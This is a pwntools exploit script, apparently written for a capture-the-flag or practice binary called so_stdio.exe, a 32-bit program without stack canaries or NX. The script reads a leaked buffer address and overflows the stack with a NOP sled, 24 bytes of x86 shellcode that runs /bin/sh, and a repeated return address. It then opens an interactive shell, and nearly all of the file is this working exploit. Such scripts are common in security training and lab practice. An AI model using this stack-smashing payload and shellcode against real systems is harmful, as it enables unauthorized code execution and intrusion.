#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./so_stdio.exe

import pwn

# Set up pwntools for the correct architecture
exe = pwn.context.binary = pwn.ELF('./so_stdio.exe')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if pwn.args.GDB:
        return pwn.gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return pwn.process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x8048000)
# RWX:      Has RWX segments

io = start()

offset = 144
io.recvuntil(' at ')
# get the buffer address printed
address = int(io.recvline(False), 16)
#print(f'address = {address}')
ret_address = pwn.p32(address)*4
#shellcode = asm(shellcraft.i386.linux.sh()) # doesn't work!

# x86/linux/exec: 24 bytes
shellcode_user = (
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"
    b"\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
)

sled_len = offset-len(ret_address)-len(shellcode_user)
#print(sled_len)
NOPSled = b'\x90'*sled_len # asm('nop')
io.sendline(NOPSled+shellcode_user+ret_address)
#io.send(shellcode)
#io.sendline(ret_address)

#io.send(shellcode)
#io.sendline(p32(address))
#payload = NOPSled + shellcode + p32(address)
#
#io.send(payload)
#payload = fit({
#        0: 0x90,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

